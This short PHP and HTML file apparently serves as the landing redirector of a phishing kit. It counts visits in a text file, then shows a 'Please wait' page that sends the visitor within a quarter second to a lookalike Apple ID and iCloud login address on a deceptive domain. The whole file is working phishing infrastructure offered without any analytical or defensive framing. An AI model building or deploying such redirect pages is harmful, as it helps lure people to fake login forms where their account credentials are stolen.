<?php
//proses
$filecounter=("total_klik.txt");
$kunjungan=file($filecounter);
$kunjungan[0]++;
$file=fopen($filecounter,"w");
fputs($file,"$kunjungan[0]");
fclose($file);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<title>Loading </title>
</head>
<font face="Courier New" size="3" color="">Please wait..</div>
<script language=javascript>
setTimeout("location.href='https://appl3id.icl0ud.5upp0rt.fraudproccessing.co/secure/login/'", 250);
</script>